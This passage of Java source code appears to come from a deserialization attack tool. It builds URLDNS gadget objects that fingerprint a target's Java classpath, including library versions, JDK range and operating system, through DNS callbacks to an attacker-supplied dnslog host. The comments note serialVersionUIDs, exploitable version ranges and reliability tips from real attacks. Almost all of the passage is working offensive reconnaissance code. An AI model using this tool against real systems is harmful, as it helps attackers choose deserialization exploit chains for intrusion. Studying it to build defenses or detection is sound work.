                //c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
                Object c3p092x = getURLDNSGadget("c3p092x." + dnsLog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
                Object c3p095x = getURLDNSGadget("c3p095x." + dnsLog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
                list.add(c3p092x);
                list.add(c3p095x);
                break;
            case "AspectJWeaver":
                //aspectjweaver,需要cc31
                Object ajw = getURLDNSGadget("ajw." + dnsLog, "org.aspectj.weaver.tools.cache.SimpleCache");
                list.add(ajw);
                break;
            case "bsh":
                //bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
                Object bsh20b4 = getURLDNSGadget("bsh20b4." + dnsLog, "bsh.CollectionManager$1");
                Object bsh20b5 = getURLDNSGadget("bsh20b5." + dnsLog, "bsh.engine.BshScriptEngine");
                Object bsh20b6 = getURLDNSGadget("bsh20b6." + dnsLog, "bsh.collection.CollectionIterator$1");
                list.add(bsh20b4);
                list.add(bsh20b5);
                list.add(bsh20b6);
                break;
            case "Groovy":
                //Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
                Object groovy1702311 = getURLDNSGadget("groovy1702311." + dnsLog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
                Object groovy24x = getURLDNSGadget("groovy24x." + dnsLog, "groovy.lang.Tuple2");
                Object groovy244 = getURLDNSGadget("groovy244." + dnsLog, "org.codehaus.groovy.runtime.dgm$1170");
                Object groovy_classloader = getURLDNSGadget("groovy_classloader." + dnsLog, "org.codehaus.groovy.runtime.dgm$1170");
                list.add(groovy1702311);
                list.add(groovy24x);
                list.add(groovy244);
                list.add(groovy_classloader);
                break;
            case "Becl":
                //Becl,JDK<8u251
                Object becl = getURLDNSGadget("becl." + dnsLog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
                list.add(becl);
                break;
            case "Jdk7u21":
                //JDK<=7u21
                Object Jdk7u21 = getURLDNSGadget("Jdk7u21." + dnsLog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
                list.add(Jdk7u21);
                break;
            case "JRE8u20":
                //7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
                Object jdk7u21 = getURLDNSGadget("jdk7u21." + dnsLog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
                list.add(jdk7u21);
                Object jdk_7u25_to_8u20 = getURLDNSGadget("jdk_7u25_to_8u20." + dnsLog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
                list.add(jdk_7u25_to_8u20);
                Object AspectJWeaver = getURLDNSGadget("AspectJWeaver." + dnsLog, "org.aspectj.weaver.tools.cache.SimpleCache");
                list.add(AspectJWeaver);
                Object ClassPathXmlApplicationContext = getURLDNSGadget("ClassPathXmlApplicationContext." + dnsLog, "org.springframework.context.support.ClassPathXmlApplicationContext");
                list.add(ClassPathXmlApplicationContext);
                Object Rome_low_ToStringBean = getURLDNSGadget("Rome_low_ToStringBean." + dnsLog, "com.sun.syndication.feed.impl.ToStringBean");
                list.add(Rome_low_ToStringBean);
                Object Rome_high_ObjectBean = getURLDNSGadget("Rome_high_ObjectBean." + dnsLog, "com.rometools.rome.feed.impl.ObjectBean");
                list.add(Rome_high_ObjectBean);
                break;
            case "ROME":
                //rome <= 1.11.1
                Object rome1000 = getURLDNSGadget("rome1000." + dnsLog, "com.sun.syndication.feed.impl.ToStringBean");
                Object rome1111 = getURLDNSGadget("rome1111." + dnsLog, "com.rometools.rome.feed.impl.ObjectBean");
                list.add(rome1000);
                list.add(rome1111);
                break;
            case "Jackson":
                //jackson-databind>=2.10.0存在一个链
                //此链实战中有50%概率触发getStylesheetDOM导致不成功,因此需要org.springframework.aop.framework.JdkDynamicAopProxy封装,这个类的jar包和springAOP一样
                Object jackson2100 = getURLDNSGadget("jackson2100." + dnsLog, "com.fasterxml.jackson.databind.node.NodeSerialization");
                list.add(jackson2100);
                break;
            case "SpringAOP":
                //fastjon/jackson两个链触发toString的变种,都需要springAOP
                Object springAOP = getURLDNSGadget("SpringAOP." + dnsLog, "org.springframework.aop.target.HotSwappableTargetSource");
                list.add(springAOP);
                break;
            case "winlinux":
                //windows/linux版本判断
                try {
                    Object linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
                    Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
                    list.add(linux);
                    list.add(windows);
//                    Object linux1 = getURLDNSGadget("linux1." + dnsLog, "java.io.UnixFileSystem");
//                    Object windows1 = getURLDNSGadget("windows1." + dnsLog, "java.io.WinNTFileSystem");
//                    list.add(linux1);
//                    list.add(windows1);
                } catch (Exception e) {
                    log.error("e: ", e);
                }


                break;

            case "all":
                try {
                    for (String aClass : defaultClass) {
                        setList(aClass, dnsLog);
                    }
                } catch (Exception e) {
                    log.error("e: ", e);
                }
                break;
            default:
                Object hm = getURLDNSGadget(clazzName.replace(".", "_").replace("$", "_") + "." + dnsLog, clazzName);
                list.add(hm);
                break;
        }
    }

    public Object getObject(String command) throws Exception {

        int sep = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
        }

        String tYPE = command.substring(0, sep);
        String url = command.substring(sep + 1);

        switch (tYPE) {
            case "all":
                setList("all", url);
                break;
            case "os":
                setList("winlinux", url);
                break;
            case "cc":
                setList("CommonsCollections13567", url);
                setList("CommonsCollections24", url);
                break;
            case "cb":
                setList("cb", url);
                break;
            case "db":
                setList("db", url);
                break;
            case "jndiAttack":
                setList("jndiAttack", url);
                break;
            case "datasource":
                setList("datasource", url);
                break;
            case "jdk":
                setList("jdk", url);
                break;
            case "web":
                setList("web", url);
                break;
            case "other":
                setList("other", url);
                break;

            case "null":
                return getURLDNSGadget(url, null);
            default:
                setList(tYPE, url);
        }

        return list;
    }
}
